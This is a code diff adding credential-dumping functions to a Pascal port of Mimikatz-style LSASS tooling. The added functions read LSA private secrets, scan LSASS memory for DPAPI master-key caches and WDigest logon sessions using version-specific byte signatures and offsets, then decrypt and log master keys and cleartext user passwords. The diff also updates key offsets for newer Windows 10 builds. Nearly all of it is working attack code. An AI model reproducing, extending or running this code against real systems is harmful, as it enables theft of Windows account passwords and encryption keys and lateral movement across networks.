@@ -12,11 +12,126 @@ function encryptLSA(cbmemory:ulong;decrypted:array of byte;var encrypted:tbytes)
 
 function findlsakeys(pid:dword;var DesKey,aeskey,iv:tbytes):boolean;
 
+function wdigest(pid:dword):boolean;
+function dpapi(pid:dword):boolean;
+
+function lsasecrets(key:string;var output:tbytes):boolean;
 
 var
   deskey,aeskey,iv,buffer:tbytes;
 
 implementation
+
+type
+  //{$PackRecords 8}
+PLSA_UNICODE_STRING=^LSA_UNICODE_STRING;
+_LSA_UNICODE_STRING = record
+  Length: USHORT;
+  MaximumLength: USHORT;
+  {$ifdef CPU64}dummy:dword;{$endif cpu64}
+  Buffer: PWIDECHAR;
+  //{$PackRecords default}
+end;
+LSA_UNICODE_STRING = _LSA_UNICODE_STRING;
+
+type
+  _LSA_OBJECT_ATTRIBUTES = record
+  Length: ULONG;
+  RootDirectory: HANDLE;
+  ObjectName: PLSA_UNICODE_STRING;
+  Attributes: ULONG;
+  SecurityDescriptor: PVOID; // Points to type SECURITY_DESCRIPTOR
+  SecurityQualityOfService: PVOID; // Points to type SECURITY_QUALITY_OF_SERVICE
+end;
+LSA_OBJECT_ATTRIBUTES = _LSA_OBJECT_ATTRIBUTES;
+
+type LSA_HANDLE = PVOID;
+
+
+function _LsaStorePrivateData(PolicyHandle: LSA_HANDLE;
+  const KeyName: pointer; PrivateData: pointer): NTSTATUS; stdcall;
+external 'advapi32.dll' name 'LsaStorePrivateData';
+
+function _LsaRetrievePrivateData(PolicyHandle: LSA_HANDLE;
+  const KeyName: LSA_UNICODE_STRING; var PrivateData: pointer): NTSTATUS; stdcall;
+external 'advapi32.dll' name 'LsaRetrievePrivateData';
+
+function _LsaOpenPolicy(SystemName: PLSA_UNICODE_STRING;
+  var ObjectAttributes: LSA_OBJECT_ATTRIBUTES; DesiredAccess: ACCESS_MASK;
+  var PolicyHandle: LSA_HANDLE): NTSTATUS; stdcall;
+external 'advapi32.dll' name 'LsaOpenPolicy';
+
+function _LsaClose(ObjectHandle: LSA_HANDLE): NTSTATUS; stdcall;
+external 'advapi32.dll' name 'LsaClose';
+
+type _LUID =record
+     LowPart:DWORD;
+     HighPart:LONG;
+end;
+
+type _KIWI_MASTERKEY_CACHE_ENTRY =record
+	Flink:nativeuint;
+	Blink:nativeuint;
+	LogonId:_LUID;
+	KeyUid:GUID;
+	insertTime:FILETIME; //or LARGE_INTEGER
+	keySize:ULONG;
+	key:array [0..127] of byte;
+end;
+KIWI_MASTERKEY_CACHE_ENTRY=_KIWI_MASTERKEY_CACHE_ENTRY;
+PKIWI_MASTERKEY_CACHE_ENTRY=^KIWI_MASTERKEY_CACHE_ENTRY;
+
+{$ifdef CPU64}
+type i_logsesslist=record
+     next:nativeuint;
+     prev:nativeuint;
+     usagecount:nativeuint;
+     this:nativeuint;
+     luid:nativeuint;
+     unk1:nativeuint;
+     //a lsa unicode string
+     len1:word;
+     maxlen1:word;
+     unk2:dword;
+     usernameptr:nativeuint;
+     //a lsa unicode string
+     len2:word;
+     maxlen2:word;
+     unk3:dword;
+     domainptr:nativeuint;
+     //a lsa unicode string
+     len3:word;
+     maxlen3:word;
+     unk4:dword;
+     passwordptr:nativeuint; //??
+     end;
+  {$endif CPU64}
+
+  {$ifdef CPU32}
+  //works at least on win7 32 bits...
+  type i_logsesslist=record
+       next:nativeuint;
+       prev:nativeuint;
+       usagecount:nativeuint;
+       this:nativeuint;
+       luid:nativeuint;
+       unk1:nativeuint;
+       unk2:nativeuint;
+       unk3:nativeuint;
+       //minmax1:nativeuint;
+       len1:word;
+       maxlen1:word;
+       usernameptr:nativeuint;
+       //minmax2:nativeuint;
+       len2:word;
+       maxlen2:word;
+       domainptr:nativeuint;
+       //minmax3:nativeuint;
+       len3:word;
+       maxlen3:word;
+       passwordptr:nativeuint; //??
+       end;
+    {$endif CPU32}
 
 type
   _KIWI_HARD_KEY =record
@@ -65,6 +180,92 @@ type
 	unk0:pointer;
         end;
      KIWI_BCRYPT_HANDLE_KEY=_KIWI_BCRYPT_HANDLE_KEY;
+
+     procedure CreateFromStr (var value:LSA_UNICODE_STRING; st : string);
+     var
+       len : Integer;
+       wst : WideString;
+     begin
+       len := Length (st);
+       Value.Length := len * sizeof (WideChar);
+       Value.MaximumLength := (len + 1) * sizeof (WideChar);
+       GetMem (Value.buffer, sizeof (WideChar) * (len + 1));
+       wst := st;
+       lstrcpyw (Value.buffer, PWideChar (wst))
+     end;
+
+function lsasecrets(key:string;var output:tbytes):boolean;
+const
+  POLICY_ALL_ACCESS = $00F0FFF;
+var
+  Status: NTSTATUS;
+  lObjectAttributes: LSA_OBJECT_ATTRIBUTES;
+  PrivateData,secret:LSA_UNICODE_STRING ;
+  data:PLSA_UNICODE_STRING =nil;
+  pol:LSA_HANDLE ;
+begin
+log('Key:'+key);
+
+ZeroMemory(@lObjectAttributes, sizeof(lObjectAttributes));
+//writeln('sizeof(lObjectAttributes):'+inttostr(sizeof(lObjectAttributes)));
+//writeln('sizeof(LSA_UNICODE_STRING):'+inttostr(sizeof(LSA_UNICODE_STRING))); //{$align 8} needed for x64
+
+
+Status := _LsaOpenPolicy(nil, lObjectAttributes, POLICY_ALL_ACCESS{POLICY_GET_PRIVATE_INFORMATION}{0}, pol);
+
+log('_LsaOpenPolicy ok');
+if ( status<>ERROR_SUCCESS ) then
+   begin
+		log('LsaOpenPolicy error:'+inttohex(status,sizeof(status)),1);
+                exit;
+   end;
+
+
+CreateFromStr(secret,key);
+CreateFromStr(PrivateData,'password');
+
+try
+
+status:=_LsaRetrievePrivateData(pol,secret,data); //works in 32 bits
+//status:=LsaStorePrivateData(pol,@secret,@PrivateData); //works in 32bits
+log('LsaRetrievePrivateData ok');
+except
+on e:exception do log('LsaRetrievePrivateData:'+e.Message )
+end;
+
+if ( status<>ERROR_SUCCESS ) then
+   begin
+                //C0020023 RPC_NT_INVALID_BOUND
+                //c0030005 RPC_NT_SS_CONTEXT_MISMATCH
+                //C0030009 RPC_NT_NULL_REF_POINTER
+                //C000000D STATUS_INVALID_PARAMETER from ntstatus.h file
+		log('LsaRetrievePrivateData error:'+inttohex(status,sizeof(status)),1);
+                exit;
+   end
+   else
+   begin
+   log('data^.Length:'+inttostr(data^.Length));
+   if ( data<>nil) and (data^.Buffer <>nil) and (data^.Length>0 ) then
+   	begin
+   	log(strpas(data^.buffer),0);
+        SetLength(output ,data^.Length);
+        CopyMemory(@output [0],data^.Buffer,data^.Length) ;
+   	end
+   	else  log('no data',1);
+
+   end;
+
+   status:=_LsaClose(pol);
+   log('_LsaClose ok');
+if ( status<>ERROR_SUCCESS ) then
+   begin
+		log('_LsaClose error:'+inttohex(status,sizeof(status)),1);
+                exit;
+   end;
+
+result:=status=0;
+
+end;
 
  function encryptLSA(cbmemory:ulong;decrypted:array of byte;var encrypted:tbytes):boolean;
      const
@@ -211,8 +412,12 @@ if lowercase(osarch) ='amd64' then
       setlength(pattern,sizeof(PTRN_WN10_LsaInitializeProtectedMemory_KEY));
       CopyMemory(@pattern[0],@PTRN_WN10_LsaInitializeProtectedMemory_KEY[0],sizeof(PTRN_WN10_LsaInitializeProtectedMemory_KEY));
       IV_OFFSET:=61 ; DES_OFFSET:=-73 ; AES_OFFSET:=16 ; //tested on 1709
-      // IV_OFFSET = 61; DES_OFFSET = -73; AES_OFFSET = 16; //before 1903
-      //{KULL_M_WIN_BUILD_10_1507,	{sizeof(PTRN_WN10_LsaInitializeProtectedMemory_KEY),	PTRN_WN10_LsaInitializeProtectedMemory_KEY}, {0, NULL}, {61, -73, 16}},
+      end;
+   if (pos('-1809',winver)>0) or (pos('-1903',winver)>0)  then //win10 1809+
+      begin
+      setlength(pattern,sizeof(PTRN_WN10_LsaInitializeProtectedMemory_KEY));
+      CopyMemory(@pattern[0],@PTRN_WN10_LsaInitializeProtectedMemory_KEY[0],sizeof(PTRN_WN10_LsaInitializeProtectedMemory_KEY));
+      IV_OFFSET:=67 ; DES_OFFSET:=-89 ; AES_OFFSET:=16 ;
       //{KULL_M_WIN_BUILD_10_1809,	{sizeof(PTRN_WN10_LsaInitializeProtectedMemory_KEY),	PTRN_WN10_LsaInitializeProtectedMemory_KEY}, {0, NULL}, {67, -89, 16}},
       end;
    end;
@@ -351,6 +556,378 @@ if (winver='6.3.9600') or (copy(winver,1,3)='10.') then
    end;
 
 result:=true;
+
+end;
+
+function dpapi(pid:dword):boolean;
+const
+  PTRN_W2K3_MasterKeyCacheList:array [0..7] of byte= ($4d, $3b, $ee, $49, $8b, $fd, $0f, $85);
+  PTRN_WI60_MasterKeyCacheList:array [0..7] of byte= ($49, $3b, $ef, $48, $8b, $fd, $0f, $84);
+  PTRN_WI61_MasterKeyCacheList:array [0..6] of byte= ($33, $c0, $eb, $20, $48, $8d, $05);  // InitializeKeyCache to avoid  version change
+  PTRN_WI62_MasterKeyCacheList:array [0..12] of byte= ($4c, $89, $1f, $48, $89, $47, $08, $49, $39, $43, $08, $0f, $85);
+  PTRN_WI63_MasterKeyCacheList:array [0..6] of byte= ($08, $48, $39, $48, $08, $0f, $85);
+  PTRN_WI64_MasterKeyCacheList:array [0..7] of byte= ($48, $89, $4e, $08, $48, $39, $48, $08);
+  PTRN_WI64_1607_MasterKeyCacheList:array [0..7] of byte= ($48, $89, $4f, $08, $48, $89, $78, $08);
+//
+ PTRN_WALL_MasterKeyCacheList_x86:array [0..3] of byte= ($33, $c0, $40, $a3);
+ PTRN_WI60_MasterKeyCacheList_x86:array [0..9] of byte= ($8b, $f0, $81, $fe, $cc, $06, $00, $00, $0f, $84);
+//
+  CALG_SHA1 = $00008004;
+  SHA_DIGEST_LENGTH = 20;
+var
+  module:string='dpapisrv.dll';
+  pattern:array of byte;
+  patch_pos:ShortInt=0;
+  hprocess,hmod:thandle;
+  hmods:array[0..1023] of thandle;
+  MODINFO:  MODULEINFO;
+  cbNeeded,count:	 DWORD;
+  szModName:array[0..254] of char;
+  addr_:pointer;
+  offset:nativeint=0;
+  offset_list:array[0..3] of byte;
+  offset_list_dword:dword;
+  list:array[0..sizeof(_KIWI_MASTERKEY_CACHE_ENTRY)-1] of byte;
+  dgst:tbytes; //array[0..19] of byte;
+  current:nativeuint;
+  decrypted:tbytes;
+  localft:FILETIME ;
+  st:SYSTEMTIME ;
+begin
+//
+   if (lowercase(osarch)='x86') then
+   begin
+   if copy(winver,1,3)='5.1' then //xp
+      begin
+      setlength(pattern,sizeof(PTRN_WALL_MasterKeyCacheList_x86));
+      copymemory(@pattern[0],@PTRN_WALL_MasterKeyCacheList_x86[0],sizeof(PTRN_WALL_MasterKeyCacheList_x86));
+      patch_pos:=-4;
+      end;
+   if copy(winver,1,3)='6.2' then  //win8.0
+      begin
+      setlength(pattern,sizeof(PTRN_WI60_MasterKeyCacheList_x86));
+      copymemory(@pattern[0],@PTRN_WI60_MasterKeyCacheList_x86[0],sizeof(PTRN_WI60_MasterKeyCacheList_x86));
+      patch_pos:=16;
+      end ;
+      if copy(winver,1,3)='6.3' then  //win8.1 aka winblue
+      begin
+      setlength(pattern,sizeof(PTRN_WALL_MasterKeyCacheList_x86));
+      copymemory(@pattern[0],@PTRN_WALL_MasterKeyCacheList_x86[0],sizeof(PTRN_WALL_MasterKeyCacheList_x86));
+      patch_pos:=-4;
+      end ;
+   end;
+  if (lowercase(osarch)='amd64') then
+   begin
+   if copy(winver,1,3)='6.0' then //vista
+      begin
+      setlength(pattern,sizeof(PTRN_WI60_MasterKeyCacheList));
+      copymemory(@pattern[0],@PTRN_WI60_MasterKeyCacheList[0],sizeof(PTRN_WI60_MasterKeyCacheList));
+      patch_pos:=-4;
+      end ;
+   if copy(winver,1,3)='6.1' then  //win7 & 2k8
+      begin
+      setlength(pattern,sizeof(PTRN_WI61_MasterKeyCacheList));
+      copymemory(@pattern[0],@PTRN_WI61_MasterKeyCacheList[0],sizeof(PTRN_WI61_MasterKeyCacheList));
+      patch_pos:=7;
+      end ;
+   if copy(winver,1,3)='6.2' then  //win8.0
+      begin
+      setlength(pattern,sizeof(PTRN_WI62_MasterKeyCacheList));
+      copymemory(@pattern[0],@PTRN_WI62_MasterKeyCacheList[0],sizeof(PTRN_WI62_MasterKeyCacheList));
+      patch_pos:=-4;
+      end ;
+   if copy(winver,1,3)='6.3' then  //win8.1 aka winblue
+      begin
+      setlength(pattern,sizeof(PTRN_WI63_MasterKeyCacheList));
+      copymemory(@pattern[0],@PTRN_WI63_MasterKeyCacheList[0],sizeof(PTRN_WI63_MasterKeyCacheList));
+      patch_pos:=-10;
+      end ;
+   if (pos('-1507',winver)>0) {or (pos('-1509',winver)>0)} then //win10
+      begin
+      setlength(pattern,sizeof(PTRN_WI64_MasterKeyCacheList));
+      copymemory(@pattern[0],@PTRN_WI64_MasterKeyCacheList[0],sizeof(PTRN_WI64_MasterKeyCacheList));
+      patch_pos:=-7;
+      end;
+   if (pos('-1607',winver)>0) {or (pos('-1609',winver)>0)} then //win10
+      begin
+      setlength(pattern,sizeof(PTRN_WI64_1607_MasterKeyCacheList));
+      copymemory(@pattern[0],@PTRN_WI64_1607_MasterKeyCacheList[0],sizeof(PTRN_WI64_1607_MasterKeyCacheList));
+      patch_pos:=11;
+      end;
+   end;
+//
+hprocess:=thandle(-1);
+hprocess:=openprocess( PROCESS_VM_READ or PROCESS_VM_WRITE or PROCESS_VM_OPERATION or PROCESS_QUERY_INFORMATION,
+                                      false,pid);
+
+  if hprocess<>thandle(-1) then
+       begin
+       log('openprocess ok',0);
+       //log(inttohex(GetModuleHandle (nil),sizeof(nativeint)));
+       cbneeded:=0;
+       if EnumProcessModules(hprocess, @hMods, SizeOf(hmodule)*1024, cbNeeded) then
+               begin
+               log('EnumProcessModules OK',0);
+
+               for count:=0 to cbneeded div sizeof(thandle) do
+                   begin
+                    if GetModuleFileNameExA( hProcess, hMods[count], szModName,sizeof(szModName) )>0 then
+                      begin
+                      //dummy:=lowercase(strpas(szModName ));
+                      if pos(lowercase(module),lowercase(strpas(szModName )))>0 then
+                         begin
+                         log(module+' found:'+inttohex(hMods[count],8),0);
+                         if GetModuleInformation (hprocess,hMods[count],MODINFO ,sizeof(MODULEINFO)) then
+                            begin
+                            log('lpBaseOfDll:'+inttohex(nativeint(MODINFO.lpBaseOfDll),sizeof(pointer)),0 );
+                            log('SizeOfImage:'+inttostr(MODINFO.SizeOfImage),0);
+                            addr_:=MODINFO.lpBaseOfDll;
+                            //offset:=search(hprocess,addr,MODINFO.SizeOfImage);
+                            log('Searching...',0);
+                            offset:=searchmem(hprocess,addr_,MODINFO.SizeOfImage,pattern);
+                            log('Done!',0);
+                            if offset<>0 then
+                                 begin
+                                 log('found:'+inttohex(offset,sizeof(pointer)),0);
+                                 //
+
+                                 if ReadMem  (hprocess,offset+patch_pos,offset_list) then
+                                 begin
+                                      CopyMemory(@offset_list_dword,@offset_list[0],4);
+                                      log('ReadProcessMemory OK '+inttohex(offset_list_dword{$ifdef CPU64}+4{$endif CPU64},4));
+                                      //new offset to the list entry
+                                      {$ifdef CPU64}
+                                      offset:= offset+offset_list_dword+4+patch_pos;
+                                      {$endif CPU64}
+                                      {$ifdef CPU32}
+                                      offset:= offset_list_dword{+patch_pos};
+                                      {$endif CPU32}
+                                      log('offset:'+leftpad(inttohex(offset,sizeof(pointer)),sizeof(pointer) * 2,'0'),0);
+                                      //
+                                      //read sesslist at offset
+                                      ReadMem  (hprocess,offset,list );
+                                      //lets skip the first one
+                                      current:=nativeuint(PKIWI_MASTERKEY_CACHE_ENTRY (@list[0] ).flink);
+                                      ReadMem  (hprocess,PKIWI_MASTERKEY_CACHE_ENTRY (@list[0] ).flink,list );
+                                      log('*****************************************************',1);
+                                      while PKIWI_MASTERKEY_CACHE_ENTRY (@list[0] ).flink<>offset do
+                                      begin
+                                      //
+                                      log('LUID:'+inttohex(PKIWI_MASTERKEY_CACHE_ENTRY (@list[0]).LogonId.LowPart,4) ,1) ;
+                                      log('GUID:'+GUIDToString (PKIWI_MASTERKEY_CACHE_ENTRY (@list[0]).KeyUid),1) ;
+                                      FileTimeToLocalFileTime (PKIWI_MASTERKEY_CACHE_ENTRY (@list[0]).insertTime,localft) ;
+                                      FileTimeToSystemTime(localft, st );
+                                      log('Time:'+DateTimeToStr (SystemTimeToDateTime (st)),1);
+                                      setlength(decrypted,PKIWI_MASTERKEY_CACHE_ENTRY (@list[0]).keySize);
+                                      if decryptLSA (PKIWI_MASTERKEY_CACHE_ENTRY (@list[0]).keySize ,PKIWI_MASTERKEY_CACHE_ENTRY (@list[0]).key ,decrypted)=false
+                                      then log('decryptLSA NOT OK',1)
+                                      else
+                                      begin
+                                      log('MasterKey:'+ByteToHexaString(decrypted),1);
+                                      if crypto_hash(CALG_SHA1, @decrypted[0], PKIWI_MASTERKEY_CACHE_ENTRY (@list[0]).keySize, dgst, SHA_DIGEST_LENGTH )
+                                         then log('SHA1:'+ByteToHexaString (dgst),1);
+                                      end;
+                                      //next logsesslist
+                                      current:=nativeuint(PKIWI_MASTERKEY_CACHE_ENTRY (@list[0] ).flink);
+                                      ReadMem  (hprocess,PKIWI_MASTERKEY_CACHE_ENTRY (@list[0] ).flink,list );
+                                      log('*****************************************************',1)
+                                      end;
+                                 end; //if readmem
+
+                                 end;
+                            end;//if GetModuleInformation...
+                         end; //if pos('samsrv.dll',dummy)>0 then
+                      end; //if GetModuleFileNameExA
+                   end; //for count:=0...
+               end; //if EnumProcessModules...
+       closehandle(hprocess);
+       end;//if openprocess...
+end;
+
+//check kuhl_m_sekurlsa_utils.c
+function wdigest(pid:dword):boolean;
+const
+  //dd Lsasrv!LogonSessionList in windbg
+  WN1703_LogonSessionList:array [0..11] of byte= ($33, $ff, $45, $89, $37, $48, $8b, $f3, $45, $85, $c9, $74);
+  WNBLUE_LogonSessionList:array [0..12] of byte=($8b, $de, $48, $8d, $0c, $5b, $48, $c1, $e1, $05, $48, $8d, $05);
+  after:array[0..1] of byte=($eb,$04);
+  //after:array[0..1] of byte=($0F,$84);
+  // Signature used to find l_LogSessList (PTRN_WIN6_PasswdSet from Mimikatz)
+  //dd wdigest!l_LogSessList in windbg
+  PTRN_WIN5_PasswdSet:array [0..3] of byte=  ($48, $3b, $da, $74);
+  PTRN_WIN6_PasswdSet:array [0..3] of byte=  ($48, $3b, $d9, $74);
+  //x86
+  PTRN_WIN5_PasswdSet_X86:array    [0..6] of byte= ($74, $18, $8b, $4d, $08, $8b, $11);
+  PTRN_WIN6_PasswdSet_X86:array    [0..6] of byte= ($74, $11, $8b, $0b, $39, $4e, $10);
+  PTRN_WIN63_PasswdSet_X86:array   [0..6] of byte= ($74, $15, $8b, $0a, $39, $4e, $10);
+  PTRN_WIN64_PasswdSet_X86:array   [0..6] of byte= ($74, $15, $8b, $0f, $39, $4e, $10);
+  PTRN_WIN1809_PasswdSet_X86:array [0..6] of byte= ($74, $15, $8b, $17, $39, $56, $10);
+var
+  module:string='wdigest.dll';
+  dummy:string;
+  hprocess,hmod:thandle;
+  hmods:array[0..1023] of thandle;
+  MODINFO:  MODULEINFO;
+  cbNeeded,count:	 DWORD;
+  szModName:array[0..254] of char;
+  addr:pointer;
+  offset_list:array[0..3] of byte;
+  offset_list_dword:dword;
+  read:cardinal;
+  offset:nativeint=0;
+  patch_pos:ShortInt=0;
+  pattern:array of byte;
+  logsesslist:array [0..sizeof(i_logsesslist)-1] of byte;
+  bytes:array[0..254] of byte;
+  password,decrypted:tbytes;
+  username,domain:array [0..254] of widechar;
+begin
+  if pid=0 then exit;
+  //if user='' then exit;
+  //
+  if (lowercase(osarch)='amd64') then
+     begin
+     if copy(winver,1,2)='5' then
+        begin
+        setlength(pattern,sizeof(PTRN_WIN5_PasswdSet));
+        copymemory(@pattern[0],@PTRN_WIN5_PasswdSet[0],sizeof(PTRN_WIN5_PasswdSet));
+        end
+        else
+        begin
+        setlength(pattern,sizeof(PTRN_WIN6_PasswdSet));
+        copymemory(@pattern[0],@PTRN_WIN6_PasswdSet[0],sizeof(PTRN_WIN6_PasswdSet));
+        end;
+     //{KULL_M_WIN_BUILD_10_1703,	{sizeof(PTRN_WN1703_LogonSessionList),	PTRN_WN1703_LogonSessionList},	{0, NULL}, {23,  -4}}
+     patch_pos:=23;
+     //{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WN63_LogonSessionList),	PTRN_WN63_LogonSessionList},	{0, NULL}, {36,  -6}},
+     patch_pos:=36;
+     //{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WIN5_PasswdSet),	PTRN_WIN5_PasswdSet},	{0, NULL}, {-4, 36}},
+     //{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_WIN5_PasswdSet),	PTRN_WIN5_PasswdSet},	{0, NULL}, {-4, 48}},
+     //{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WIN6_PasswdSet),	PTRN_WIN6_PasswdSet},	{0, NULL}, {-4, 48}},
+     patch_pos:=-4;
+     end;
+  if (lowercase(osarch)='x86') then
+     begin
+        setlength(pattern,7);
+          if copy(winver,1,3)='5.1' then copymemory(@pattern[0],@PTRN_WIN5_PasswdSet_X86[0],7);
+          //vista - 6.0
+          if (copy(winver,1,3)='6.0')
+             or (copy(winver,1,3)='6.1')
+             or (copy(winver,1,3)='6.2') then copymemory(@pattern[0],@PTRN_WIN6_PasswdSet_X86[0],7);
+          //win 8.1 6.3
+          if copy(winver,1,3)='6.3' then copymemory(@pattern[0],@PTRN_WIN63_PasswdSet_X86[0],7);
+          //generic for now
+          patch_pos:=-6;
+     end;
+
+  if patch_pos =0 then
+     begin
+     log('no patch mod for this windows version',1);
+     exit;
+     end;
+  log('patch pos:'+inttostr(patch_pos ),0);
+  //
+  hprocess:=thandle(-1);
+  hprocess:=openprocess( PROCESS_VM_READ or PROCESS_VM_WRITE or PROCESS_VM_OPERATION or PROCESS_QUERY_INFORMATION,
+                                        false,pid);
+  if hprocess<>thandle(-1) then
+       begin
+       log('openprocess ok',0);
+       //log(inttohex(GetModuleHandle (nil),sizeof(nativeint)));
+       cbneeded:=0;
+       if EnumProcessModules(hprocess, @hMods, SizeOf(hmodule)*1024, cbNeeded) then
+               begin
+               log('EnumProcessModules OK',0);
+
+               for count:=0 to cbneeded div sizeof(thandle) do
+                   begin
+                    if GetModuleFileNameExA( hProcess, hMods[count], szModName,sizeof(szModName) )>0 then
+                      begin
+                      dummy:=lowercase(strpas(szModName ));
+                      if pos(lowercase(module),dummy)>0 then
+                         begin
+                         log(module+' found:'+inttohex(hMods[count],8),0);
+                         if GetModuleInformation (hprocess,hMods[count],MODINFO ,sizeof(MODULEINFO)) then
+                            begin
+                            log('lpBaseOfDll:'+inttohex(nativeint(MODINFO.lpBaseOfDll),sizeof(pointer)),0 );
+                            log('SizeOfImage:'+inttostr(MODINFO.SizeOfImage),0);
+                            addr:=MODINFO.lpBaseOfDll;
+                            //offset:=search(hprocess,addr,MODINFO.SizeOfImage);
+                            log('Searching...',0);
+                            offset:=searchmem(hprocess,addr,MODINFO.SizeOfImage,pattern);
+                            log('Done!',0);
+                            if offset<>0 then
+                                 begin
+                                 log('found:'+inttohex(offset,sizeof(pointer)),0);
+                                 //
+                                 if ReadMem  (hprocess,offset+patch_pos,offset_list) then
+                                   begin
+                                   CopyMemory(@offset_list_dword,@offset_list[0],4);
+                                   log('ReadProcessMemory OK '+inttohex(offset_list_dword{$ifdef CPU64}+4{$endif CPU64},4));
+                                   //we now should get a match with .load lsrsrv.dll then dd Lsasrv!LogonSessionList
+                                   //new offset to the list entry
+                                   {$ifdef CPU64}
+                                   offset:= offset+offset_list_dword+4+patch_pos;
+                                   {$endif CPU64}
+                                   {$ifdef CPU32}
+                                   offset:= offset_list_dword{+patch_pos};
+                                   {$endif CPU32}
+                                   log('offset:'+leftpad(inttohex(offset,sizeof(pointer)),sizeof(pointer) * 2,'0'),0);
+                                   //read sesslist at offset
+                                   ReadMem  (hprocess,offset,logsesslist );
+                                   dummy:=inttohex(i_logsesslist (logsesslist ).next,sizeof(pointer));
+                                   //lets skip the first one
+                                   ReadMem  (hprocess,i_logsesslist (logsesslist).next,logsesslist );
+                                   //lets loop
+                                   //while dummy<>leftpad(inttohex(offset,sizeof(pointer)),sizeof(pointer) * 2,'0') do
+                                   //while dummy<>inttohex(offset,sizeof(pointer)) do
+                                   while i_logsesslist (logsesslist).next<>offset do
+                                   begin
+                                   log('entry#this:'+inttohex(i_logsesslist (logsesslist ).this ,sizeof(pointer)),0) ;
+                                   log('entry#next:'+dummy,0) ;
+                                   log('usagecount:'+inttostr(i_logsesslist (logsesslist ).usagecount),1) ;
+                                   //get username
+                                   if ReadMem  (hprocess,i_logsesslist (logsesslist ).usernameptr,bytes )
+                                   //copymemory(@username[0],@bytes[0],64);
+                                      then log('username:'+strpas (pwidechar(@bytes[0])),1);
+                                   //get domain
+                                   if ReadMem  (hprocess,i_logsesslist (logsesslist ).domainptr,bytes )
+                                   //copymemory(@domain[0],@bytes[0],64);
+                                      then log('domain:'+strpas (pwidechar(@bytes[0])),1);
+                                   //
+                                   log('pwdlen:'+inttostr(i_logsesslist (logsesslist ).maxlen3),1) ;
+                                   if (i_logsesslist (logsesslist ).maxlen3>0) and (i_logsesslist (logsesslist ).usagecount>0) then
+                                     begin
+                                     setlength(password,i_logsesslist (logsesslist ).maxlen3);
+                                     ReadMem  (hprocess,i_logsesslist (logsesslist ).passwordptr ,@password[0],i_logsesslist (logsesslist ).maxlen3 );
+                                     setlength(decrypted,1024);
+                                     if decryptLSA (i_logsesslist (logsesslist ).maxlen3,password,decrypted)=true
+                                        then log('Password:'+strpas (pwidechar(@decrypted[0]) ),1);
+                                     end;
+                                   //decryptcreds;
+                                   //next
+                                   ReadMem  (hprocess,i_logsesslist (logsesslist).next,logsesslist );
+                                   dummy:=inttohex(i_logsesslist (logsesslist).next,sizeof(pointer));
+                                   end;
+                                   //...
+
+                                   end; //if readmem
+                                 end;
+                            {//test - lets read first 4 bytes of our module
+                             //can be verified with process hacker
+                            if ReadProcessMemory( hprocess,addr,@buffer[0],4,@read) then
+                               begin
+                               log('ReadProcessMemory OK');
+                               log(inttohex(buffer[0],1)+inttohex(buffer[1],1)+inttohex(buffer[2],1)+inttohex(buffer[3],1));
+                               end;
+                            }
+                            end;//if GetModuleInformation...
+                         end; //if pos('samsrv.dll',dummy)>0 then
+                      end; //if GetModuleFileNameExA
+                   end; //for count:=0...
+               end; //if EnumProcessModules...
+       closehandle(hprocess);
+       end;//if openprocess...
 
 end;
 
